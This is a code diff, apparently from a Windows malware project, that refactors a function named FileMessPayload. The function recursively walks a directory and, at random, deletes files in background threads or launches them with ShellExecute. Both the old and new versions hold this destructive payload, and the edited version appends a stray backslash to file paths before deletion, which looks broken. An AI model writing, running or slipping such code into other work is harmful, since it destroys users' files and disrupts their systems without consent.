@@ -632,41 +632,41 @@ void DeleteThread(LPCWSTR strFileName) {
 	SHFileOperation(&shfo);
 }
 
-void FileMessPayload(PWSTR szDirectory) {
-	if (szDirectory[wcslen(szDirectory) - 1] != '\\' && wcslen(szDirectory) < 260) {
-		szDirectory[wcslen(szDirectory)] = '\\';
+void FileMessPayload(LPWSTR Directory) {
+	if (Directory[wcslen(Directory) - 1] != '\\' && wcslen(Directory) < MAX_PATH) {
+		lstrcat(Directory, L"\\");
 	}
 
-	WCHAR szSearchDir[MAX_PATH] = { 0 };
-	lstrcpy(szSearchDir, szDirectory);
-	lstrcat(szSearchDir, L"*.*");
+	WCHAR SearchDir[MAX_PATH] = { 0 };
+	lstrcpy(SearchDir, Directory);
+	lstrcat(SearchDir, L"*.*");
 
 	WIN32_FIND_DATA findData;
-	HANDLE hSearch = FindFirstFile(szSearchDir, &findData);
+	HANDLE hSearch = FindFirstFile(SearchDir, &findData);
 
 	if (hSearch == INVALID_HANDLE_VALUE) {
 		return;
 	}
 	else do {
-		if (!lstrcmpW(findData.cFileName, L".") || !lstrcmpW(findData.cFileName, L"..") || findData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) {
+		if (!lstrcmp(findData.cFileName, L".") || !lstrcmp(findData.cFileName, L"..") || findData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT) {
 			continue;
 		}
 
-		WCHAR szPath[MAX_PATH] = { 0 };
-		lstrcpy(szPath, szDirectory);
-		lstrcat(szPath, findData.cFileName);
+		WCHAR Path[MAX_PATH] = { 0 };
+		lstrcpy(Path, Directory);
+		lstrcat(Path, findData.cFileName);
 
 		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-			lstrcat(szPath, L"\\");
-			FileMessPayload(szPath);
+			lstrcat(Path, L"\\");
+			FileMessPayload(Path);
 		}
-		else if (random() % 2 == 0 && wcslen(szPath) < 260) {
-			szPath[wcslen(szPath)] = '\0\0';
-			CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(DeleteThread), (PVOID)szPath, 0, NULL);
+		else if (random() % 2 == 0 && wcslen(Path) < MAX_PATH) {
+			lstrcat(Path, L"\\");
+			CreateThread(NULL, 0, LPTHREAD_START_ROUTINE(DeleteThread), (PVOID)Path, 0, NULL);
 			Sleep(500);
 		}
 		else if (random() % 2 == 0) {
-			ShellExecute(NULL, L"open", szPath, NULL, szDirectory, SW_SHOW);
+			ShellExecute(NULL, L"open", Path, NULL, Directory, SW_SHOW);
 			Sleep(500);
 		}
 	} while (FindNextFile(hSearch, &findData));
